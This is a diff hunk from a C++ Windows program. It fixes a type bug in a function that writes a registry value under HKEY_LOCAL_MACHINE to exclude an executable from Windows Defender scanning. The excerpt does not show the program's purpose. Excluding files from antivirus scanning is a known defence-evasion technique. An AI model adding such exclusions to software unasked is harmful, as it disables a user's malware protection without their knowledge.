@@ -191,10 +191,9 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
     LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
                               REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
     if (rc != ERROR_SUCCESS) return FALSE;
-    // Add exclusion for the exe path
-    std::wstring val = L"0"; // 0 = exclude file
+    DWORD val = 0;
     rc = RegSetValueExW(hKey, exePath, 0, REG_DWORD,
-                        reinterpret_cast<const BYTE*>(val.c_str()), sizeof(DWORD));
+                        reinterpret_cast<const BYTE*>(&val), sizeof(val));
     RegCloseKey(hKey);
     if (rc != ERROR_SUCCESS) return FALSE;
 
